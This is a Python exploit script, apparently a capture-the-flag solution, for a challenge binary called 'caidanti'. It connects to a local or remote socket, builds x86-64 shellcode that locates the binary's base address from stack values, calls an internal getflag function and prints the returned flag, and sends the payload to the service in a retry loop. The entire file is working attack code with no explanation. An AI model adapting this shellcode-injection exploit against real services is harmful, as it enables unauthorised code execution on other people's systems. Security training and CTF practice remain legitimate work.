#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './dist/chal/caidanti'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'54.177.17.135', 'port':23333})
env.select()

#==========

binf = ELF(bin_file)
offset_plt_puts     = 0x10d00
offset_plt_mprotect = 0x10d70
offset_getflag1     = 0x07f00
offset_instance     = 0x12140

libc = ELF('./libc.so')
offset_libc_mmap        = libc.sep_function['mmap']
offset_libc_munmap      = libc.sep_function['munmap']
offset_libc_memcpy      = libc.sep_function['memcpy']

#==========

def attack(conn, **kwargs):
    cdt = CaiDanTi(conn)

    shellasm = '''
    mov     r13, [rsp]
    sub     r13, 0x7205
    mov     r14, [rsp+0x18]
    sub     r14, 0xadeb0
    '''

    shellasm += '''
    lea rax, [r13 + {OFFSET_INSTANCE}]
    mov rax, [rax]
    mov rdi, rax

    mov rax, 0x10
    shl rax, 56
    push rax
    mov rax, 0x6C6C61434C444946
    push rax
    mov rax, 0x416564614D756F59
    push rax
    mov rsi, rsp

    sub rsp, 0x18
    mov rdx, rsp

    lea rax, [r13 + {OFFSET_GETFLAG1}]
    call rax

    pop rdi
    lea rax, [r13 + {OFFSET_PLT_PUTS}]
    call rax

    hlt
    '''.format(OFFSET_INSTANCE = offset_instance, OFFSET_GETFLAG1 = offset_getflag1, OFFSET_PLT_PUTS = offset_plt_puts)

    cdt.execute(asm(shellasm))
    print conn.recvuntil('\n')

class CaiDanTi:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def execute(self, payload):
        self.sendlineafter('114514', '114514')
        self.sendlineafter('size: ', str(len(payload)))
        self.send(payload)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)

#==========
